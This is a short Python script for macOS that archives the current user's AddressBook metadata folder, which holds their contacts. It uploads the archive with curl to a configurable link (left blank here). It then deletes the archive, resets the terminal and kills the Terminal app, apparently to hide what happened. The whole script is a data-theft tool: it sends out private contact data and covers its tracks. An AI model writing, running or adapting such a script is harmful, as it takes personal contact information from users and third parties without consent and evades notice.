#!/usr/bin/env python
import os
import shutil
import getpass
from os.path import expanduser
import subprocess

home = expanduser("~")

clocation = home + "/Library/Application Support/AddressBook/Metadata/"

uploadlink = ""

user = getpass.getuser()

zipname = "./{0}".format(user)

shutil.make_archive(zipname, 'zip', clocation)

try:
    run_command = subprocess.check_output('curl -F "contact=@{0}.zip" {1}'.format(zipname, uploadlink))
except subprocess.CalledProcessError:
    pass

os.remove("./{0}.zip".format(zipname))
subprocess.call(['tput', 'reset'])
subprocess.call(['killall', 'Terminal'])
